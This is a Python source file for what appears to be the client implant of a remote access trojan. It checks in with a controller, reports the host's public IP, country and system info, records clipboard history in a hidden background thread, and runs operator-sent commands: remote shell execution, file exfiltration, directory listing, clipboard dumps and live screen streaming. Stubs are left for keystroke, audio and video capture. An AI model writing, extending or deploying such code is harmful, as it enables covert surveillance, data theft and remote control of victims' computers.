import sys
import logging
import time
import platform
import subprocess
import requests
import json
import pyautogui
import numpy as np
import cv2
import os
import pickle
import pyperclip
import threading
from datetime import datetime
from connection_module import SecureConnectionClient

logging.basicConfig(level=logging.DEBUG,
                    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
                    handlers=[
                        logging.FileHandler("client_module.log"),
                        logging.StreamHandler(sys.stdout)
                    ])

start_port, end_port = 50000, 50100

SERVER_IP = '127.0.0.1'

DEFAULT_CHUNK_SIZE = 1024 * 1024 * 16

clipboard_history = []

def get_ip_and_country():
    response = requests.get("https://api.ipify.org?format=json")
    ip = response.json()['ip']
    response = requests.get(f"https://ipinfo.io/{ip}/json")
    data = response.json()
    country = data.get('country', 'Unknown')
    return ip, country

def system_info(client):
    operation_system = platform.system()
    cmd = "systeminfo" if operation_system == "Windows" else "lscpu"
    encoding = 'cp866' if operation_system == "Windows" else 'utf-8'
    process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, encoding=encoding)
    stdout, stderr = process.communicate()
    client.send_data_AES((stdout + stderr).encode("utf-8"))

def command_line(client):
    operation_system = platform.system()
    encoding = 'cp866' if operation_system == "Windows" else 'utf-8'
    while True:
        command = client.receive_data_AES().decode("utf-8")
        if command == "exit":
            break
        if operation_system == "Windows":
            command = f'cmd /c {command}'
        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, encoding=encoding)
        stdout, stderr = process.communicate()
        client.send_data_AES((stdout + stderr).encode("utf-8"))
    
def remote_file_copy(client):
    try:
        file_path = client.receive_data_AES().decode("utf-8")
        with open(file_path, 'rb') as file:
            while True:
                chunk = file.read(DEFAULT_CHUNK_SIZE)
                if not chunk:
                    break
                client.send_data_AES(chunk)
        client.send_data_AES(b"EOF")
    except Exception as e:
        client.send_data_AES(f"ERROR: {str(e)}".encode("utf-8"))
        logging.error(f"An error occurred: {e}")

def send_file(client):
    try:
        file_path = client.receive_data_AES().decode("utf-8")
        file_size = os.path.getsize(file_path)
        client.send_data_AES(str(file_size).encode("utf-8")) 

        with open(file_path, 'rb') as file:
            while True:
                chunk = file.read(DEFAULT_CHUNK_SIZE)
                if not chunk:
                    break
                client.send_data_AES(chunk)
        client.send_data_AES(b"EOF")
    except Exception as e:
        client.send_data_AES(f"ERROR: {str(e)}".encode("utf-8"))

def list_directory(client):
    try:
        path = client.receive_data_AES().decode("utf-8")
        if not os.path.isdir(path):
            client.send_data_AES(b"ERROR: Not a directory")
            return
        files = os.listdir(path)
        client.send_data_AES(pickle.dumps(files))
    except Exception as e:
        client.send_data_AES(f"ERROR: {str(e)}".encode("utf-8"))

def input_capture(client):
    pass

def clipboard_data(client):
    clipboard_history_json = json.dumps(clipboard_history)
    clipboard_history_bytes = clipboard_history_json.encode('utf-8')
    client.send_data_AES(clipboard_history_bytes)

def screenshot_capture(client):
    pass

def audio_capture(client):
    pass

def video_capture(client):
    pass

def screen_capture(client):
    capturing = True
    while capturing:
        screenshot = pyautogui.screenshot()
        screenshot_np = np.array(screenshot)
        screenshot_np = cv2.resize(screenshot_np, (1280, 720))
        screenshot_np = cv2.cvtColor(screenshot_np, cv2.COLOR_BGR2GRAY)
        img_data = screenshot_np.tobytes()
        try:
            client.send_data_AES(img_data)
        except Exception as e:
            print(f"Error sending image {e}")
            raise e
        signal = client.receive_data_AES()
        if signal == b"STOP":
            capturing = False

def get_clipboard_content():
    return pyperclip.paste()

def track_clipboard():
    last_content = None
    while True:
        current_content = get_clipboard_content()
        if current_content != last_content:
            timestamp = datetime.now().isoformat()
            clipboard_entry = {"content": current_content, "timestamp": timestamp}
            clipboard_history.append(clipboard_entry)
            last_content = current_content
            print(f"Clipboard updated: {current_content} at {timestamp}")
        time.sleep(1)

def start_tracking():
    tracker_thread = threading.Thread(target=track_clipboard)
    tracker_thread.daemon = True
    tracker_thread.start()
    return tracker_thread

def main():
    tracker_thread = start_tracking()
    while True:
        try:
            for port in range(start_port, end_port):
                logging.info(f"Starting client to connect to {SERVER_IP}:{port}")
                try:
                    client = SecureConnectionClient(server_ip=SERVER_IP, server_port=port)
                    break
                except Exception as e:
                    logging.error(f"Failed to connect to {SERVER_IP}:{port}")
            ip, country = get_ip_and_country()
            operation_system = platform.system()
            cmd = "systeminfo" if operation_system == "Windows" else "lscpu"
            encoding = 'cp866' if operation_system == "Windows" else 'utf-8'
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, encoding=encoding)
            stdout, stderr = process.communicate()
            systeminfo = stdout + stderr
            data = {"ip": ip, "country": country, "os": operation_system, "systeminfo": systeminfo}
            json_data = json.dumps(data)
            json_bytes = json_data.encode("utf-8")
            client.send_data_AES(json_bytes)
            
            while True:
                command = client.receive_data_AES()
                if command == b"SI":
                    system_info(client)
                elif command == b"CMD":
                    command_line(client)
                elif command == b"RFC":
                    remote_file_copy(client)
                elif command == b"LSD":
                    list_directory(client)
                elif command == b"SND":
                    send_file(client)
                elif command == b"IC":
                    input_capture(client)
                elif command == b"CD":
                    clipboard_data(client)
                elif command == b"SCC":
                    screenshot_capture(client)
                elif command == b"AC":
                    audio_capture(client)
                elif command == b"VC":
                    video_capture(client)
                elif command == b"SC":
                    screen_capture(client)
                elif command == 'exit':
                    break

            client.close()
            logging.info("Client connection closed")
        except Exception as e:
            logging.error(f"An error occurred: {e}")
        time.sleep(15)

if __name__ == "__main__":
    main()
